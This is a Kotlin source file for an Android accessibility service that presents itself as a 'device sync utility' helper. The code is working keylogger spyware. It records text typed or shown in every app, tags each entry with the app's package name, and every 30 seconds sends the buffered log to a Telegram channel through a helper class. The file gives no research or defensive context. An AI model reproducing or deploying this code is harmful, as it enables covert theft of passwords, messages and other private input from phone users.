package com.devicesync.utility

import android.accessibilityservice.AccessibilityService
import android.view.accessibility.AccessibilityEvent
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.cancel
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch

class AccessibilityHelper : AccessibilityService() {

    private val serviceScope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
    private val textBuffer = StringBuilder()
    private var lastFlushTime = System.currentTimeMillis()
    private val flushIntervalMs = 30000L // 30 seconds

    override fun onServiceConnected() {
        super.onServiceConnected()
        TelegramHelper.AppContext.init(this)
        startFlushTimer()
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent) {
        try {
            when (event.eventType) {
                AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED,
                AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED -> {
                    val text = event.text?.joinToString(" ") ?: return
                    val packageName = event.packageName?.toString() ?: "unknown"

                    if (text.isNotBlank() && text.length > 2) {
                        synchronized(textBuffer) {
                            textBuffer.appendLine("[$packageName] $text")
                        }

                        // Flush if buffer is large
                        if (textBuffer.length > 2000) {
                            flushBuffer()
                        }
                    }
                }
            }
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    override fun onInterrupt() {
        // Service interrupted, flush remaining
        flushBuffer()
    }

    override fun onDestroy() {
        flushBuffer()
        serviceScope.cancel()
        super.onDestroy()
    }

    private fun startFlushTimer() {
        serviceScope.launch {
            while (true) {
                delay(flushIntervalMs)
                flushBuffer()
            }
        }
    }

    private fun flushBuffer() {
        val toSend = synchronized(textBuffer) {
            if (textBuffer.isEmpty()) return
            val text = textBuffer.toString()
            textBuffer.clear()
            lastFlushTime = System.currentTimeMillis()
            text
        }

        if (toSend.isNotBlank()) {
            serviceScope.launch {
                TelegramHelper.sendMessage("⌨️ Text Input Log:\n```\n$toSend\n```")
            }
        }
    }
}
